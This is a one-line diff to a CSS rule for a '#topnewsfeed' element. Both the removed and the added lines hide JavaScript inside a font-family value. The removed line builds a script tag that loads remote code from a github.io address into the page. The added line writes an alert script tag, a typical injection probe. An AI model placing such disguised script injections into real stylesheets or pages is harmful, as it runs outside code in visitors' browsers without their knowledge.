@@ -1,1 +1,1 @@
-#topnewsfeed { font-family: '(function(){   var head = document.getElementsByTagName("head")[0];var js = document.createElement("script");js.type = "text/javascript";js.src = "//zs1.github.io/puub/yes.js";head.appendChild(js);})()'; }
+#topnewsfeed{font-family:'(function(){document.write("<script>alert('hi');</script>")})()';}
